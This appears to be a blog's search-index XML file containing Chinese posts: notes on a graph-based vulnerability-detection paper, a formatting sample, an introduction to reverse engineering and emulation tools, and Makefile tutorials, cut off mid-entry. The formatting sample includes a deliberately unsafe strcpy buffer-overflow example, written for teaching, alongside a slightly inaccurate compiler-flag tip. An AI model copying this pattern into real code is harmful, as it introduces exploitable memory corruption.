<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>GraphFVD - Property graph-based fine-grained vulnerability detection</title>
      <link href="/2025/03/18/Papers/Vul/GraphFVD/"/>
      <url>/2025/03/18/Papers/Vul/GraphFVD/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h2 id="0-abstract">0 Abstract</h2><p>深度学习技术可以自动从软件源代码中提取功能，从而广泛用于检测软件漏洞。大多数现有的深度学习方法都依赖整个功能或序列级程序切片来识别漏洞。但是，这些方法通常很难捕获全面的脆弱性语义，从而导致高误报率和假阴性率。在本文中，我们提出了GraphFVD，这是一种基于图形的新型属性细粒漏洞检测方法。</p><p>我们的方法从代码属性图中提取基于图形的属性切片，并引入了一个分层注意图卷积网络以学习图形嵌入。 GraphFVD提供了一个细粒的代码表示，该表示，捕获语法，控制流，数据流以及与漏洞相关的源代码的自然顺序顺序。我们评估了方法对两个现实世界漏洞数据集的有效性。实验结果表明，我们的方法在两个数据集上都优于现有的最新漏洞检测方法。</p><h2 id="1-intro">1 Intro</h2><p>我们提出了一种新颖的细粒代码表示，从代码属性图中提取图形级程序切片（即基于属性图的漏洞候选或PRVC）。 PRVC结合了抽象语法，控制流，数据流和代码的顺序顺序，从而捕获了全面而精确的程序语义。</p><p>•我们设计一个分层注意力图卷积网络（HIERGCN），以学习PRVC的嵌入并预测漏洞。 HIERGCN在关系图卷积网络（RGCN）中引入了分层的关注，并纳入了当地注意力和全球关注。这种注意机制使我们能够根据其重要性融合不同令牌和节点的特征。</p><p>•我们使用两个现实世界漏洞数据集评估了方法GraphFVD的有效性。实验结果表明，GraphFVD优于最先进的漏洞检测技术。</p><h2 id="2-architecture-method">2 Architecture &amp; Method</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202503162137575.png" alt="image-20250316213750498"></p><p>PrVC</p><p><strong>将库/API函数调用用作提取程序切片的主要入口点</strong>。</p><p><strong>与敏感变量关联的节点作为切片的入口点。</strong></p><p><strong>包含算术运算符的代码语句作为切片的入口点。</strong></p><p><strong>选择切片入口点时考虑了if-条件语句。</strong></p><p>我们可以根据两个特征来区分不同的节点：类型和代码。通过匹配定义的代码特性，我们可以提取四种类型的SEP。具体而言，每个SEP满足以下条件之一：（1）类型为函数，代码对应于1506个函数调用之一； （2）类型是识别类或参数，并且代码包含“ =”和（’*‘或’[’）; （3）类型是表达式阶段，代码包含“ =”并与表达式匹配； （4）类型是ifStatement或参数，并且代码包含“ if”。</p><p>为了说明SEP识别过程，我们以敏感变量为例。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202503162155481.png" alt="image-20250316215516407"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202503162156030.png" alt="image-20250316215604975"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202503162156534.png" alt="image-20250316215654473"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202503162158607.png" alt="image-20250316215853540"></p><p>为了增强RGCN处理大漏洞数据集的能力，一种自然的方法是增加RGCN层的数量。</p><p>但是，直接堆叠多个RGCN层可能会导致成倍增长的扩展邻域导致噪声传播，从而阻碍性能优化。受He等人（2016年）的启发，我们结合了剩余联系以应对这一挑战。残留连接使梯度可以直接通过该层，从而有效缓解消失或爆炸梯度问题。因此，我们重新定义节点功能矩阵更新过程，如下所示：<img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202503162159683.png" alt="image-20250316215939644"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202503171610358.png" alt="image-20250317161021319"></p><h2 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h2><h3 id="dataset-and-process">DataSet and Process</h3><h3 id="evaluation"><strong>Evaluation</strong></h3><h2 id="conclusion">Conclusion</h2><p>💡 Others​</p><hr><p>正如先前研究中强调的那样（Cheng等，2021; Li等，2018，2021b; Cao等，2022），滥用库/API函数是程序漏洞的主要原因。例如，MEMSET是C/C ++标准库中典型的与内存相关的函数，通常参与界外写入和其他类似的与内存有关的漏洞。因此，<strong>我们将库/API函数调用用作提取程序切片的主要入口点</strong>。具体而言，我们选择了1506个功能调用，这些调用使用了几个静态检测器（Flawfinder，2024; CheckMarx，2024）识别。传统的基于静态分析的方法也广泛采用了敏感变量（指针和阵列变量）（Li等，2020； Sui等，2012）。敏感变量的使用不当通常会导致漏洞，例如NULL指针取消，双免费和缓冲区溢出（FlawFinder，2024）。例如，如图2（a）所示，如果未注册平台特定的PMU驱动程序，则指针变量PPMU设置为无效，并访问其成员触发了无效的指针解除漏洞。</p><p>可以通过检查ppmu是否在访问前为null来减轻此漏洞。<strong>因此，我们还选择与敏感变量关联的节点作为切片的入口点。<strong>算术运算符（例如加法或减法）在程序中很常见，并且在数据处理和计算中起着至关重要的作用。这些操作的缺陷，例如整数溢出或零分割可以导致程序异常或漏洞。因此，对于与算术运算符有关的漏洞，我们选择</strong>包含算术运算符的代码语句作为切片的入口点。</strong></p><p>除了上述三个常见的代码特征外，**我们还在选择切片入口点时考虑了if-条件语句。**该决定基于我们对众多脆弱的代码实例的观察，其中某些漏洞与if条件语句相关联。如果条件语句中的逻辑错误或不正确的条件评估可能会导致程序执行路径不当，从而可能导致漏洞。例如，在图2（b）中，当没有DM设备时，所需的变量设置为零，而变量LEN则在get_result_buffer函数中更新。 DM_ICTOL结构需要八个字节才能存储。在这种情况下，第9行的ifcondition语句评估为false，导致程序跳到第13行。这可能导致界外写作，因为LEN可能小于8。我们可以通过在第9行中修改IFCONDITION语句来解决此漏洞。因此，通过选择与条件语句相关的节点作为切片入口点，我们可以在程序的执行路径中追踪决策点，从而有助于发现与条件判断相关的漏洞。</p><p>为了解释从CPG中提取SEP的详细过程，我们在图3中介绍了弱点函数的CpG。</p><p>橙色盒子对应于AST节点，这些节点通过绿色虚线连接，代表抽象语法边缘。此外，每个黄色虚线说明了从一个节点到另一节点的数据流。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202503162147652.png" alt="image-20250316214758588"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202503170948264.png" alt="image-20250317094845185"></p>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>样式调整样例</title>
      <link href="/2024/04/27/Tools/%E6%A0%B7%E5%BC%8F%E8%B0%83%E6%95%B4%E6%A0%B7%E4%BE%8B/"/>
      <url>/2024/04/27/Tools/%E6%A0%B7%E5%BC%8F%E8%B0%83%E6%95%B4%E6%A0%B7%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="标题样式">标题样式</h1><h1 id="title-1">title 1</h1><h2 id="title2">title2</h2><h3 id="title3">title3</h3><h4 id="title4">title4</h4><h5 id="title5">title5</h5><h1 id="文本">文本</h1><p>加粗：<strong>这是一段加粗文本</strong></p><p>斜体：<em>这是一段斜体文本</em></p><p>下划线：<u>这是带下划线的文本</u></p><p>删除线：<s>这是删除线文本</s></p><p>高亮：<mark>这是高亮文本</mark></p><h1 id="引用">引用</h1><blockquote><p>这是一个引用块</p></blockquote><h1 id="警告框">警告框</h1><blockquote><p>[!NOTE]</p><p>note</p></blockquote><blockquote><p>[!TIP]</p><p>tip</p></blockquote><blockquote><p>[!IMPORTANT]</p><p>important</p></blockquote><blockquote><p>[!WARNING]</p><p>warning</p></blockquote><blockquote><p>[!CAUTION]</p><p>caution</p></blockquote><h1 id="代码块">代码块</h1><p>缓冲区溢出是编程中的一种常见安全漏洞，它发生在当程序尝试向一个固定长度的缓冲区内写入过多数据时。这可能导致数据溢出到相邻的内存空间，可能会导致程序崩溃、数据损坏或安全漏洞，如执行任意代码。</p><p>下面是一个简单的C++缓冲区溢出示例代码，它演示了一个不安全的字符串拷贝操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;cstdio&gt;</span></span><br><span class="line">void vulnerableFunction(char* src) &#123;</span><br><span class="line">    char buffer[<span class="number">10</span>]; // 定义一个大小为<span class="number">10</span>的字符数组</span><br><span class="line">    // 危险：没有检查src的长度，直接拷贝，可能导致溢出</span><br><span class="line">    strcpy(buffer, src);</span><br><span class="line">    // 打印溢出后的结果</span><br><span class="line">    printf(<span class="string">&quot;Content in buffer: %s\n&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    char src[] = <span class="string">&quot;This is an example string that is too long for the buffer&quot;</span>;</span><br><span class="line">    vulnerableFunction(src);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>buffer</code> 数组的大小被设置为10个字节，但是 <code>src</code> 字符串的长度远远超过了10个字节。当 <code>strcpy</code> 函数被调用时，它会将 <code>src</code> 字符串（包括终止符 <code>\0</code>）复制到 <code>buffer</code> 中，由于没有空间检查，这将导致 <code>buffer</code> 溢出。</p><blockquote><p>[!WARNING]</p><p>在实际编程中，您应该始终避免编写可能导致缓冲区溢出的代码。在C<ins>中，可以使用更安全的函数，如 <code>strncpy</code>（并手动添加终止符 <code>\0</code>），或者使用C</ins>的字符串类 <code>std::string</code> 来避免这类问题。</p></blockquote><p>此外，现代编译器通常会提供选项来检测和防止缓冲区溢出，例如，使用GCC或Clang的 <code>-ftrapv</code> 或 <code>-Warray-bounds</code> 选项。</p><p>在处理字符串和内存操作时，始终要注意边界检查和内存分配，以确保程序的安全性和稳定性。</p><h1 id="列表">列表</h1><h2 id="无序列表">无序列表</h2><ul><li>无序列表</li><li>无序列表<ul><li>无序列表</li><li>无序列表<ul><li>无序列表</li><li>无序列表<ul><li>无序列表<ul><li>无序列表</li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="有序列表">有序列表</h2><ol><li>有序列表</li><li>有序列表</li><li>有序列表</li></ol><h2 id="任务列表">任务列表</h2><ul><li>[x] 任务1</li><li>[ ] 任务2</li><li>[ ] 任务3</li></ul><h1 id="表格">表格</h1><table><thead><tr><th>第一列</th><th>第二列</th></tr></thead><tbody><tr><td>aaaa</td><td>bbbb</td></tr><tr><td>cccc</td><td>dddd</td></tr><tr><td>eeee</td><td>ffff</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>软件的加密与解密</title>
      <link href="/2024/04/26/Security/software%20security/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AE%80%E4%BB%8B/"/>
      <url>/2024/04/26/Security/software%20security/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="软件的加密与解密">软件的加密与解密</h2><blockquote><p>软件的加密与解密技术是矛与盾的关系，它们是在互相斗争中发展进步的。</p></blockquote><p>两者在技术上的较量归根到底是一种利益的冲突。<u>软件开发者为了维护自身的商业利益，不断寻找各种有效的技术来保护软件的版权，推迟软件被解密的时间；而解密者则受盗版所带来的高额利润的驱使或纯粹出于个人兴趣，不断开发新的解密工具，针对新出现的保护方式进行跟踪分析，以找到相应的解密方法。</u></p><p>没有无法解密的保护。对软件的保护仅靠技术是不够的，最终要靠人们的知识产权意识和法制观念的进步及生活水平的提高。如果一种保护技术的强度能达到让解密者在软件的生命周期内都无法将其完全破解的程度，这种保护技术就是成功的。软件保护方式的设计应在一开始就作为软件开发的一部分来考虑，列入开发计划和开发成本，并在保护强度、成本、易用性之间进行折中考虑，选择一个平衡点。</p><p>作为一个合格的程序员，要上至需求分析、设计抽象、设计模式，下至系统核心，熟悉整个系统的底层结构。</p><h2 id="软件逆向工程">软件逆向工程</h2><p>逆向工程(Reverse Engineering)是指根据已有的产物和结果，通过分析来推导出具体的实现方法。</p><p>对软件来说，==“可执行程序-&gt;反编译-&gt;源代码”==的过程就是逆向工程。</p><p>逆向工程的内容可以分为如下 3 类。</p><ul><li>软件使用限制的去除或者软件功能的添加。</li><li>软件源代码的再获得。</li><li>硬件的复制和模拟。</li></ul><p>坦白地讲，现在的逆向工程，其真实目的就是再利用。</p><h2 id="逆向分析技术">逆向分析技术</h2><h4 id="1通过软件使用说明和操作格式分析软件">1.通过软件使用说明和操作格式分析软件</h4><h4 id="2静态分析技术">2.静态分析技术</h4><p>所谓静态分析，是指根据反汇编得到的程序清单进行分析，最常用的方法是从提示信息人手进行分析。</p><h4 id="3动态分析技术">3.动态分析技术</h4><p>静态分析只是第一步，动态跟踪才是分析软件的关键。所谓动态跟踪主要是指利用 OllyDbg 或 WinDbg 等调试工具，一步一步跟踪分析。</p><ul><li><p>许多软件在整体上完成的功能，一般要分解成若干模块来实现，后一模块在执行时往往需要使用前一模块处理的结果，这一结果叫作中间结果。</p></li><li><p>许多软件在运行时，其最初执行的一段程序往往需要对后面的各个模块进行一些初始化工作，并不依赖系统的重定位。</p></li><li><p>许多加密程序为了阻止非法跟踪和阅读，对执行代码的大部分内容进行了加密变换，但只有很短的一段程序是明文的。</p></li></ul><p>字节存储顺序“endian” 一词来源于《格列佛游记》。在小说中，小人国的居民为吃鸡蛋时该从大的一端(Big-End) 剥开还是从小的一端 (Little-End) 剥开而争论，争论的双方分别称为 “Big-endian&quot; 和“Little-endian&quot;。计算机领域在描述 “关于字节该以什么样的顺序传送的争论”时引用了 “endian&quot;一词，翻译为“字节序”，表示数据在存储器中的存放顺序，主要分为大端序 (Big-endian) 和小端序 ( Little-endian ), 其区别如下</p><ul><li><p>Big-endian：高位字节存入低地址，低位字节存入高地址。</p></li><li><p>Little-endian：低位字节存入低地址，高位字节存入高地址。</p></li></ul><p><mark>x86 系列 CPU 都是 Little-endian 字节序，PowerPC 通常是 Big-endian 字节序。因为网络协议也都是采用 Big-endian 方式传输数据的，所以有时也把 Big-endian 方式称为网络字节序。</mark></p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程开源引擎框架</title>
      <link href="/2024/04/26/Security/binary/%E5%BC%80%E6%BA%90%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/"/>
      <url>/2024/04/26/Security/binary/%E5%BC%80%E6%BA%90%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="逆向工程开源引擎框架">逆向工程开源引擎框架</h1><p>Capstone, Keystone, Unicorn, Qemu 以及 QiLing 等工具</p><h2 id="汇编与反汇编">汇编与反汇编</h2><h3 id="capstone">Capstone</h3><blockquote><p>新加坡南洋理工大学团队在 Blackhat USA 2014 上发布的一个反汇编引擎</p></blockquote><ul><li>Capstone 反汇编引擎 官网<a href="http://www.capstone-engine.org/">The Ultimate Disassembly Framework – Capstone – The Ultimate Disassembler (capstone-engine.org)</a></li><li>项目主页：<a href="https://github.com/aquynh/capstone">https://github.com/aquynh/capstone</a></li><li>多平台 Windows、*nix</li><li>多架构，例如 Arm、Mips 和 x86</li><li>支持 C/Python 接口</li></ul><h3 id="keystone">Keystone</h3><blockquote><p>新加坡南洋理工大学团队在 Blackhat USA 2016 上发布的一个汇编框架</p></blockquote><ul><li>Keystone 汇编框架 官网<a href="https://www.keystone-engine.org/">Keystone – The Ultimate Assembler (keystone-engine.org)</a></li><li>项目主页：<a href="https://github.com/keystone-engine/keystone">https://github.com/keystone-engine/keystone</a></li><li>多平台：Windows、* nix</li><li>多架构，例如 Arm、Mips 和 x86</li><li>支持 C/Python 接口</li></ul><h2 id="二进制模拟执行">二进制模拟执行</h2><h3 id="qemu">QEMU</h3><blockquote><p>QEMU是一套由Fabrice Bellard所编写的模拟处理器的自由软件，一个通用的系统空间和用户空间仿真器和虚拟机</p></blockquote><ul><li><p>QEMU 虚拟机 官网</p></li><li><p>项目主页：<a href="https://github.com/qemu/qemu">https://github.com/qemu/qemu</a></p></li><li><p>多平台：Windows、* nix</p></li><li><p>多架构，例如 Arm、Mips 和 x86</p></li><li><p>支持 C/Python 接口</p></li></ul><h3 id="unicorn">Unicorn</h3><blockquote><p>新加坡南洋理工大学团队在 Blackhat USA 2015 上发布的轻量级多平台，多体系结构的CPU仿真器框架</p></blockquote><p>Unicorn 引擎 CPU仿真框架 官网</p><ul><li>项目主页：<a href="https://github.com/unicorn-engine/unicorn">https://github.com/unicorn-engine/unicorn</a></li><li>多平台：Windows、* nix</li><li>多架构，例如 Arm、Mips 和 x86</li><li>支持 C/Python 接口</li><li>基于 QEMU</li></ul><p>QEMU 提供了一个完整的仿真环境，既可以模拟硬件外设、整个系统，也可以模拟单个二进制程序。而 Unicorn 专注于 CPU 指令的仿真。</p><h3 id="qiling">QiLing</h3><blockquote><p>京东团队在 Defcon 2019 上发布的高级二进制仿真框架</p></blockquote><ul><li>官网</li><li>项目主页：<a href="https://github.com/qilingframework/qiling">https://github.com/qilingframework/qiling</a></li><li>多平台：Windows、* nix</li><li>多架构，例如 Arm、Mips 和 x86</li><li>基于 Unicorn</li></ul><p>Qiling 被设计为更高级别的框架，它利用 Unicorn 来模拟 CPU 指令，除此之外，还具有高级分析功能：执行动态检测，甚至可以在运行时热修补代码</p><h2 id="总结">总结</h2><p>上述用于二进制逆向的开源工具，都提供了详细的使用方法，并且有团队一直在维护，对于研究二进制病毒、恶意样本分析大有裨益。例如，</p><ul><li>修改固件、二进制，增加或者修改其中的指令，可以使用 Capstone/Keystone 进行汇编指令与二进制的转换;</li><li>跨平台仿真一些架构的二进制可执行文件， 可以使用 QEMU</li><li>二进制指令片段的模拟，可以使用 Unicorn、QiLing</li></ul><p>笔者使用过其中的几个，且有想法去集成其中的一些功能，编写一个可视化工具。在这里只是进行简单的介绍，如果感兴趣，还是要实际操作一下。这些工具的官网都给出了使用教程，用起来还是比较简单的。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用make更新函数库文件</title>
      <link href="/2024/04/26/Security/binary/Makefile/9.%E4%BD%BF%E7%94%A8make%E6%9B%B4%E6%96%B0%E5%87%BD%E6%95%B0%E5%BA%93%E6%96%87%E4%BB%B6/"/>
      <url>/2024/04/26/Security/binary/Makefile/9.%E4%BD%BF%E7%94%A8make%E6%9B%B4%E6%96%B0%E5%87%BD%E6%95%B0%E5%BA%93%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="使用make更新函数库文件">使用make更新函数库文件<a href="https://seisman.github.io/how-to-write-makefile/archives.html#make">¶</a></h1><p>函数库文件也就是对Object文件（程序编译的中间文件）的打包文件。在Unix下，一般是由命令 <code>ar</code> 来完成打包工作。</p><h2 id="函数库文件的成员">函数库文件的成员<a href="https://seisman.github.io/how-to-write-makefile/archives.html#id1">¶</a></h2><p>一个函数库文件由多个文件组成。你可以用如下格式指定函数库文件及其组成:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">archive(member)</span><br></pre></td></tr></table></figure><p>这个不是一个命令，而一个目标和依赖的定义。一般来说，这种用法基本上就是为了 <code>ar</code> 命令来服务的。如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foolib(hack.o) : hack.o</span><br><span class="line">    ar cr foolib hack.o</span><br></pre></td></tr></table></figure><p>如果要指定多个member，那就以空格分开，如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foolib(hack.o kludge.o)</span><br></pre></td></tr></table></figure><p>其等价于:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foolib(hack.o) foolib(kludge.o)</span><br></pre></td></tr></table></figure><p>你还可以使用Shell的文件通配符来定义，如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foolib(*.o)</span><br></pre></td></tr></table></figure><h2 id="函数库成员的隐含规则">函数库成员的隐含规则<a href="https://seisman.github.io/how-to-write-makefile/archives.html#id2">¶</a></h2><p>当make搜索一个目标的隐含规则时，一个特殊的特性是，如果这个目标是 <code>a(m)</code> 形式的，其会把目标变成 <code>(m)</code> 。于是，如果我们的成员是 <code>%.o</code> 的模式定义，并且如果我们使用 <code>make foo.a(bar.o)</code> 的形式调用Makefile时，隐含规则会去找 <code>bar.o</code> 的规则，如果没有定义 <code>bar.o</code> 的规则，那么内建隐含规则生效，make会去找 <code>bar.c</code> 文件来生成 <code>bar.o</code> ，如果找得到的话，make执行的命令大致如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cc -c bar.c -o bar.o</span><br><span class="line">ar r foo.a bar.o</span><br><span class="line">rm -f bar.o</span><br></pre></td></tr></table></figure><p>还有一个变量要注意的是 <code>$%</code> ，这是专属函数库文件的自动化变量，有关其说明请参见“自动化变量”一节。</p><h2 id="函数库文件的后缀规则">函数库文件的后缀规则<a href="https://seisman.github.io/how-to-write-makefile/archives.html#id3">¶</a></h2><p>你可以使用“后缀规则”和“隐含规则”来生成函数库打包文件，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.c.a:</span><br><span class="line">    $(CC) $(CFLAGS) $(CPPFLAGS) -c $&lt; -o $*.o</span><br><span class="line">    $(AR) r $@ $*.o</span><br><span class="line">    $(RM) $*.o</span><br></pre></td></tr></table></figure><p>其等效于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(%.o) : %.c</span><br><span class="line">    $(CC) $(CFLAGS) $(CPPFLAGS) -c $&lt; -o $*.o</span><br><span class="line">    $(AR) r $@ $*.o</span><br><span class="line">    $(RM) $*.o</span><br></pre></td></tr></table></figure><h2 id="注意事项">注意事项<a href="https://seisman.github.io/how-to-write-makefile/archives.html#id4">¶</a></h2><p>在进行函数库打包文件生成时，请小心使用make的并行机制（ <code>-j</code> 参数）。如果多个 <code>ar</code> 命令在同一时间运行在同一个函数库打包文件上，就很有可以损坏这个函数库文件。所以，在make未来的版本中，应该提供一种机制来避免并行操作发生在函数打包文件上。</p><p>但就目前而言，你还是应该不要尽量不要使用 <code>-j</code> 参数。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile隐含规则</title>
      <link href="/2024/04/26/Security/binary/Makefile/8.%E9%9A%90%E5%90%AB%E8%A7%84%E5%88%99/"/>
      <url>/2024/04/26/Security/binary/Makefile/8.%E9%9A%90%E5%90%AB%E8%A7%84%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h1 id="隐含规则">隐含规则<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id1">¶</a></h1><p>在我们使用Makefile时，有一些我们会经常使用，而且使用频率非常高的东西，比如，我们编译C/C++的源程序为中间目标文件（Unix下是 <code>.o</code> 文件，Windows下是 <code>.obj</code> 文件）。本章讲述的就是一些在Makefile中的“隐含的”，早先约定了的，不需要我们再写出来的规则。</p><p>“隐含规则”也就是一种惯例，make会按照这种“惯例”心照不喧地来运行，那怕我们的Makefile中没有书写这样的规则。例如，把 <code>.c</code> 文件编译成 <code>.o</code> 文件这一规则，你根本就不用写出来，make会自动推导出这种规则，并生成我们需要的 <code>.o</code> 文件。</p><p>“隐含规则”会使用一些我们系统变量，我们可以改变这些系统变量的值来定制隐含规则的运行时的参数。如系统变量 <code>CFLAGS</code> 可以控制编译时的编译器参数。</p><p>我们还可以通过“模式规则”的方式写下自己的隐含规则。用“后缀规则”来定义隐含规则会有许多的限制。使用“模式规则”会显得更智能和清楚，但“后缀规则”可以用来保证我们Makefile的兼容性。我们了解了“隐含规则”，可以让其为我们更好的服务，也会让我们知道一些“约定俗成”了的东西，而不至于使得我们在运行Makefile时出现一些我们觉得莫名其妙的东西。当然，任何事物都是矛盾的，水能载舟，亦可覆舟，所以，有时候“隐含规则”也会给我们造成不小的麻烦。只有了解了它，我们才能更好地使用它。</p><h2 id="使用隐含规则">使用隐含规则<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id2">¶</a></h2><p>如果要使用隐含规则生成你需要的目标，你所需要做的就是不要写出这个目标的规则。那么，make会试图去自动推导产生这个目标的规则和命令，如果 make可以自动推导生成这个目标的规则和命令，那么这个行为就是隐含规则的自动推导。当然，隐含规则是make事先约定好的一些东西。例如，我们有下面的一个Makefile：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo : foo.o bar.o</span><br><span class="line">    cc –o foo foo.o bar.o $(CFLAGS) $(LDFLAGS)</span><br></pre></td></tr></table></figure><p>我们可以注意到，这个Makefile中并没有写下如何生成 <code>foo.o</code> 和 <code>bar.o</code> 这两目标的规则和命令。因为make的“隐含规则”功能会自动为我们自动去推导这两个目标的依赖目标和生成命令。</p><p>make会在自己的“隐含规则”库中寻找可以用的规则，如果找到，那么就会使用。如果找不到，那么就会报错。在上面的那个例子中，make调用的隐含规则是，把 <code>.o</code> 的目标的依赖文件置成 <code>.c</code> ，并使用C的编译命令 <code>cc –c $(CFLAGS) foo.c</code> 来生成 <code>foo.o</code> 的目标。也就是说，我们完全没有必要写下下面的两条规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foo.o : foo.c</span><br><span class="line">    cc –c foo.c $(CFLAGS)</span><br><span class="line">bar.o : bar.c</span><br><span class="line">    cc –c bar.c $(CFLAGS)</span><br></pre></td></tr></table></figure><p>因为，这已经是“约定”好了的事了，make和我们约定好了用C编译器 <code>cc</code> 生成 <code>.o</code> 文件的规则，这就是隐含规则。</p><p>当然，如果我们为 <code>.o</code> 文件书写了自己的规则，那么make就不会自动推导并调用隐含规则，它会按照我们写好的规则忠实地执行。</p><p>还有，在make的“隐含规则库”中，每一条隐含规则都在库中有其顺序，越靠前的则是越被经常使用的，所以，这会导致我们有些时候即使我们显示地指定了目标依赖，make也不会管。如下面这条规则（没有命令）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.o : foo.p</span><br></pre></td></tr></table></figure><p>依赖文件 <code>foo.p</code> （Pascal程序的源文件）有可能变得没有意义。如果目录下存在了 <code>foo.c</code> 文件，那么我们的隐含规则一样会生效，并会通过 <code>foo.c</code> 调用C的编译器生成 <code>foo.o</code> 文件。因为，在隐含规则中，Pascal的规则出现在C的规则之后，所以，make找到可以生成 <code>foo.o</code> 的C的规则就不再寻找下一条规则了。如果你确实不希望任何隐含规则推导，那么，你就不要只写出“依赖规则”，而不写命令。</p><h2 id="隐含规则一览">隐含规则一览<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id3">¶</a></h2><p>这里我们将讲述所有预先设置（也就是make内建）的隐含规则，如果我们不明确地写下规则，那么，make就会在这些规则中寻找所需要规则和命令。当然，我们也可以使用make的参数 <code>-r</code> 或 <code>--no-builtin-rules</code> 选项来取消所有的预设置的隐含规则。</p><p>当然，即使是我们指定了 <code>-r</code> 参数，某些隐含规则还是会生效，因为有许多的隐含规则都是使用了“后缀规则”来定义的，所以，只要隐含规则中有 “后缀列表”（也就一系统定义在目标 <code>.SUFFIXES</code> 的依赖目标），那么隐含规则就会生效。默认的后缀列表是：.out, .a, .ln, .o, .c, .cc, .C, .p, .f, .F, .r, .y, .l, .s, .S, .mod, .sym, .def, .h, .info, .dvi, .tex, .texinfo, .texi, .txinfo, .w, .ch .web, .sh, .elc, .el。具体的细节，我们会在后面讲述。</p><p>还是先来看一看常用的隐含规则吧。</p><ol><li><p>编译C程序的隐含规则。</p><p><code>&lt;n&gt;.o</code> 的目标的依赖目标会自动推导为 <code>&lt;n&gt;.c</code> ，并且其生成命令是 <code>$(CC) –c $(CPPFLAGS) $(CFLAGS)</code></p></li><li><p>编译C++程序的隐含规则。</p><p><code>&lt;n&gt;.o</code> 的目标的依赖目标会自动推导为 <code>&lt;n&gt;.cc</code> 或是 <code>&lt;n&gt;.C</code> ，并且其生成命令是 <code>$(CXX) –c $(CPPFLAGS) $(CXXFLAGS)</code> 。（建议使用 <code>.cc</code> 作为C++源文件的后缀，而不是 <code>.C</code> ）</p></li><li><p>编译Pascal程序的隐含规则。</p><p><code>&lt;n&gt;.o</code> 的目标的依赖目标会自动推导为 <code>&lt;n&gt;.p</code> ，并且其生成命令是 <code>$(PC) –c $(PFLAGS)</code> 